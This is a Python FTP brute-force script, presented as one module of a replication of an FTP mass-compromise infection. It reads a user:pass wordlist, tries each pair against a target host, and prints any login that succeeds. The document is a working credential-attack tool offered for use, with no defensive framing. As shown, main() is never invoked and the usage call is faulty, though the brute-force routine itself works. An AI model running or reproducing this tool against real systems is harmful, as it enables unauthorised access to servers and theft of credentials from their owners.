#!/usr/bin/python3

"""
FTP Mass Compromise replication of k985ytv infection
Module 2 - FTP BruteForcer
"""

import ftplib
import optparse

Creds = False

def bruteLogin(host,passfile):
    global Creds
    with open(passfile,'r') as pF:
        for line in pF.readlines():
            user   = line.split(':')[0]
            passwd = line.split(':')[1].strip('\r').strip('\n')
            print("[*] Trying "+line)
            try:
                ftp = ftplib.FTP(host)
                ftp.login(user,passwd)
                print("[+] Login Succeeded ==> "+host+":"+user+"/"+passwd)
                ftp.quit()
                Creds = True
                return
            except:
                pass



def main():
    parser = optparse.OptionParser(usage = "Usage : ./FtpBrute.py -H <host> -f <user:pass file>")
    parser.add_option("-H", dest = 'host', type = str, help = "The Target IP to attack")
    parser.add_option("-f", dest = 'passfile', type = str, help = "Dictionary in user:pass format")
    options,args = parser.parse_args()
    
    host     = options.host
    passfile = options.passfile
    
    if( host == None or passfile == None ):
        print(parser.usage())
        exit(0)
    
    bruteLogin(host,passfile)
    
    if( not Creds ):
        print("[-] Couldn't Bruteforce the Password, Maybe try a better wordlist")
